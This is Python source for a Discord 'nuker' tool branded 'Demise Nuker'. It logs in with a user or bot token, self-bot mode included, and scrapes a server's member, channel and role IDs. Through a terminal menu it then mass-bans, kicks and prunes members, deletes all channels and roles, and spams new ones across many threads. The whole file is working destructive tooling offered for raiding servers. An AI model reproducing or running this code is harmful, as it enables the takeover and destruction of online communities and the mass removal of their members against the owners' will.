##IMPORTS
import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
#DISCORD IMPORTS

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

#SET CONSOLE WINDOW TITLE

os.system(f'cls & mode 85,20 & title [Demise Nuker] - Configuration')

#COLOR VARS

c_red = '\x1B[31m'
c_black = '\x1B[30m'
c_green = '\x1B[32m'
c_yellow = '\x1B[33m'
c_blue = '\x1B[34m'
c_magenta = '\x1B[35m'
c_cyan = '\x1B[36m'
c_white = '\x1B[37m'


#START INPUT VARS

token = input(f'{c_red}> {c_white}Token{c_red}: {c_white}')
rich_presence = input(f'{c_red}> {c_white}Rich Presence ({c_red}Y{c_white}/{c_red}N{c_white}){c_red}: {c_white}')


os.system('cls')


#Check token function

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

#Rich presence function

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("823325496393465906")
            RPC.connect()
            RPC.update(details="[CONNECTED]", large_image="1", small_image="2", large_text="make by zo,#0001", start=time.time())
        except:
            pass


#Define Variables

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

#Determine token type

if token_type == "user":
    headers = {"Authorization": f'{token}'}
    client = commands.Bot(command_prefix="$", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {"Authorization": f'Bot {token}'}
    client = commands.Bot(command_prefix="$", case_insensitive=False, intents=intents)

client.remove_command("help")


class Demise:

    ##Set default colour

    def __init__(self):
        self.colour = f'{c_red}'
    #Ban Members Function

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Banned{self.colour} {member.strip()}{c_white}")
                    break
                else:
                    break

    #Kick Function

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Kicked{self.colour} {member.strip()}{c_white}")
                    break
                else:
                    break


    #Delete Channels

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Channel Eviscerated {self.colour} {channel.strip()}{c_white}")
                    break
                else:
                    break


    #Delete Roles

    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Role Eviscerated {self.colour} {role.strip()}{c_white}")
                    break
                else:
                    break


    #Channel Spam

    def SpamChannels(self, guild ,name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f"https://discord.com/api/v8/guilds/{guild}/channels", headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Created Channel{self.colour} {name}{c_white}")
                    break
                else:
                    break


    #Role Spam

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 2001 or r.status_code == 204:
                    print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Created Role{self.colour} {name}{c_white}")
                    break
                else:
                    break

    #Scrape Info

    async def Scrape(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove('Scraped/members.txt')
            os.remove('Scraped/channels.txt')
            os.remove('Scraped/roles.txt')
        except:
            pass


        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{self.colour}[{c_white}+{self.colour}]{c_white} Scraped {self.colour}{membercount}{c_white} Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{self.colour}[{c_white}+{self.colour}]{c_white} Scraped {self.colour}{channelcount}{c_white} Channels")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{self.colour}[{c_white}+{c_red}]{c_white} Scraped {self.colour}{rolecount}{c_white} Roles")
            r.close()


    #Nuke Execute

    async def NukeExecute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        channel_name = input(f"{self.colour}> {c_white}Channel Names{self.colour}: {c_white}")
        channel_amount = input(f"{self.colour}> {c_white}Channel Amount{self.colour}: {c_white}")
        role_name = input(f"{self.colour}> {c_white}Role Names{self.colour}: {c_white}")
        role_amount = input(f"{self.colour}> {c_white}Role Amount{self.colour}: {c_white}")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    #Ban Execute

    async def BanExecute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()


    #Kick Execute

    async def KickExecute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    #Channel Delete Execute

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    #Role Delete Execute

    async def RoleDeleteExcute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()


    #Channel Spam Execute

    async def ChannelSpamExecute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        name = input(f'{self.colour}> {c_white}Channel Names{self.colour}: {c_white}')
        amount = input(f'{self.colour}> {c_white}Amount{self.colour}: {c_white}')
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()


    #Role Spam Execute

    async def RoleSpamExecute(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        name = input(f'{self.colour}> {c_white}Role Names{self.colour}: {c_white}')
        amount = input(f'{self.colour}> {c_white}Amount{self.colour}: {c_white}')
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    #Prune Members

    async def PruneMembers(self):
        guild = input(f'{self.colour}> {c_white}Guild ID{self.colour}: {c_white}')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

    def Credits(self):
        os.system(f'cls & mode 85,20 & title [Demise Nuker] - Credits')
        print(f'''


                    ▓█████▄ ▓█████  ███▄ ▄███▓ ██▓  ██████ ▓█████
                    ▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▓██▒▒██    ▒ ▓█   ▀
                    ░██   █▌▒███   ▓██    ▓██░▒██▒░ ▓██▄   ▒███
                    ░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ░██░  ▒   ██▒▒▓█  ▄
                    ░▒████▓ ░▒████▒▒██▒   ░██▒░██░▒██████▒▒░▒████▒
                    {self.colour}▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
                    {self.colour}░ ▒  ▒  ░ ░  ░░  ░      ░ ▒ ░░ ░▒  ░ ░ ░ ░  ░
                    {self.colour}░ ░  ░    ░   ░      ░    ▒ ░░  ░  ░     ░
                    {self.colour}░       ░  ░       ░    ░        ░     ░  ░
                    {self.colour}░



                            {self.colour}[\033[37mDiscord{self.colour}] {c_white}zo,#0001
                            {self.colour}[\033[37mGithub{self.colour}] {c_white}ziminglol

        \033[37m''')

    async def ThemeChanger(self):
        os.system(f'cls & mode 85,20 & title [Demise Nuker] - Themes')
        print(f'''


                    ▓█████▄ ▓█████  ███▄ ▄███▓ ██▓  ██████ ▓█████
                    ▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▓██▒▒██    ▒ ▓█   ▀
                    ░██   █▌▒███   ▓██    ▓██░▒██▒░ ▓██▄   ▒███
                    ░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ░██░  ▒   ██▒▒▓█  ▄
                    ░▒████▓ ░▒████▒▒██▒   ░██▒░██░▒██████▒▒░▒████▒
                    {self.colour}▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
                    {self.colour}░ ▒  ▒  ░ ░  ░░  ░      ░ ▒ ░░ ░▒  ░ ░ ░ ░  ░
                    {self.colour}░ ░  ░    ░   ░      ░    ▒ ░░  ░  ░     ░
                    {self.colour}░       ░  ░       ░    ░        ░     ░  ░
                    {self.colour}░

      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mRed               {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mPurple            {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mGrey              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mGreen             {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mBlue              {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mPeach             {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mYellow            {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mPink              {self.colour}║\033[37m [{self.colour}M\033[37m] \033[37mMenu              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mOrange            {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mCyan              {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m

        \033[37m''')
        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')

        if choice == '1':
            self.colour = '\x1b[38;5;196m'
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = '\x1b[38;5;34m'
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = '\x1b[38;5;142m'
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[38;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[38;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = '\x1b[38;5;21m'
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[38;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[38;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[38;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[38;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title [Demise Nuker] - Connected: {client.user}')
        print(f'''


                    ▓█████▄ ▓█████  ███▄ ▄███▓ ██▓  ██████ ▓█████
                    ▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▓██▒▒██    ▒ ▓█   ▀
                    ░██   █▌▒███   ▓██    ▓██░▒██▒░ ▓██▄   ▒███
                    ░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ░██░  ▒   ██▒▒▓█  ▄
                    ░▒████▓ ░▒████▒▒██▒   ░██▒░██░▒██████▒▒░▒████▒
                    {self.colour}▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
                    {self.colour}░ ▒  ▒  ░ ░  ░░  ░      ░ ▒ ░░ ░▒  ░ ░ ░ ░  ░
                    {self.colour}░ ░  ░    ░   ░      ░    ▒ ░░  ░  ░     ░
                    {self.colour}░       ░  ░       ░    ░        ░     ░  ░
                    {self.colour}░

      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mBan Members       {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mDelete Channels   {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mScrape Info       {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mKick Members      {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mCreate Roles      {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mChange Themes     {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mPrune Members     {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mCreate Channels   {self.colour}║\033[37m [{self.colour}C\033[37m] \033[37mView Credits      {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mDelete Roles      {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mNuke Server       {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m

        \033[37m''')

        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExcute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Demise().Menu()

    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{self.colour}> \033[37mInvalid Token')
            input()
            os._exit(0)

if __name__ == "__main__":
    Demise().Startup()
